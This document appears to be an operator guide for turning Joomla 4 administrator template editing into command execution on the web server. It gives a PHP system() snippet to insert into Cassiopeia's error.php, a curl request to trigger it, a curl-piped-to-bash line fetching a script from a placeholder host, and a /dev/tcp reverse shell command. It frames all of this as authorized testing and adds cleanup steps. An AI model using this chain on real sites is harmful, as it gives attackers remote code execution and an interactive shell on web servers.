# Joomla template code and the web process boundary

Use for an explicitly authorized edit/execution test of a Joomla PHP template, or diagnosis of an acquired template modification. Required context is the actual Joomla version, template/file, administrator edit authority, original bytes, web route/SAPI and selected intended command/effect. A web-admin session is not the same as a database login. This branch includes the actual template edit and process action; linting alone is only preparation.

## Prepare and apply the selected edit

In Joomla 4, the administrator's System → Site Templates → selected template's Details and Files view can expose source editing. Select the actual file, for example Cassiopeia's `error.php`, and preserve its original complete bytes. `index.php`, `error.php` and another template are different files. The account needs the relevant edit permissions and the server needs writable storage. An administrator-looking username does not establish either.

Prepare the small fixed PHP operation for the requested task. A controlled identity probe can use this **illustrative snippet**, placed only at a reviewed reachable PHP location:

~~~php
<?php
$status = 0;
system('id', $status);
echo "\ncommand_status=" . $status . "\n";
?>
~~~

Use the intended installed identity executable if lookup differs in the web environment. Don't add a URL-controlled command parameter. Define `php_bin` as the trusted matching local CLI and `edited_file` as the prepared complete file, then check syntax:

~~~bash
"$php_bin" -l "$edited_file"
~~~

This is not the target web SAPI/configuration. Check for a preceding `die`, exception, missing dependency or framework guard which prevents the appended operation. PHP `system` executes a shell command and prints its output; the optional status argument is the child's result, while the return value is its last output line. Missing/disabled system, wrong server mapping and a syntactically valid but unreachable insertion are different failures.

Apply the authorized edit through the actual template editor and verify it saved the selected file. If using a CLI HTTP adaptation, reproduce the observed authenticated form, template/file selector, body fields and session-bound CSRF token; the Joomla controller checks a token and edit authority. Do not invent a universal POST endpoint or bypass those checks. The GUI edit is a demonstrated path; only the subsequent PHP/HTTP procedure is CLI-adapted here.

## Request the route and interpret the effect

Define `url` as the verified route to this file and fresh private `headers`/`body` captures:

~~~bash
curl --silent --show-error --connect-timeout 5 --max-time 30 \
  --dump-header "$headers" --output "$body" --write-out 'status=%{http_code}\n' "$url"
~~~

Historical Cassiopeia testing used `/templates/cassiopeia/error.php/error`; that trailing PATH_INFO is a deployment-specific observation, not a universal Joomla command endpoint. Correct Host, document-root routing and PHP handler matter. A save confirmation, 200/fallback page or lint pass does not prove execution. Record actual output/marker and effective identity in the server context. A www-data result establishes that process's identity, not the Joomla account's OS identity or a privilege increase.

## Selected script or interactive callback action

When the authorized task requires more than an identity probe, use a fixed reviewed command/artifact rather than turning the template into an arbitrary command interface. The demonstrated mechanism can retrieve a controlled script and pass it to Bash through `system`. It requires the web process's outbound route, reachable owned server, installed curl/Bash, correct interpreter and a tracked receiver when a callback is selected. Static file serving only transfers bytes; it does not run the script itself.

The direct pattern `system('curl http://owned-server.example:8080/task.sh | bash', $status)` **executes retrieved bytes**. A failed curl can be hidden by a successful final Bash in the pipeline. Prefer acquiring an exact reviewed artifact to a fresh task-owned writable path, checking curl completion and expected bytes/digest, then invoking that selected local script with the intended Bash. Define those paths from actual permissions; don't invent a writable `/tmp` path or permanently change PHP settings. Record transfer, invocation and effect separately.

For a specifically authorized two-way callback, a Bash-interpreted script can contain this adaptable command; replace both tokens with the owned reachable numeric endpoint before use:

~~~bash
sh -i >& /dev/tcp/OWNED_IP/OWNED_PORT 0>&1
~~~

**Bash opens the redirections**, then starts sh. `/dev/tcp` is Bash handling, not a real kernel device or a portable sh feature. Piping the script to Bash ignores its shebang; invoking it with `sh` can break the redirection. Select the receiver command from the installed nc implementation's help, start it before the trigger, and retain peer plus actual in-session identity. A plain socket is not a PTY. If the child retains output streams or stays interactive, the HTTP request may wait/time out even after execution; a timeout is not proof of rollback or no callback. Inspect the selected effect before triggering again.

Interpret identity commands in the actual server OS. A Windows Apache/PHP process can report a domain-qualified service account such as an illustrative `EXAMPLE\web_service`; a Joomla superuser is still an application identity. Linux `id` is not a portable Windows token query, and a returned account name alone does not establish enabled privileges or administrator/SYSTEM authority. Preserve the OS/SAPI and independent process/token evidence when reviewing a captured result.

Exit/stop only the owned child/receiver/server, restore the exact original selected template bytes and verify the resulting file/route through established access. Don't overwrite another actor's intervening edit. Finish with the actual file, trigger, command/identity/effect and restoration status; a connection or root-shaped prompt alone is insufficient.

Resolve behavior with [PHP system and output/status](https://www.php.net/manual/en/function.system.php), the [Joomla template save controller](https://github.com/joomla/joomla-cms/blob/4.2.6/administrator/components/com_templates/src/Controller/TemplateController.php) and [Bash redirections](https://www.gnu.org/software/bash/manual/html_node/Redirections.html).
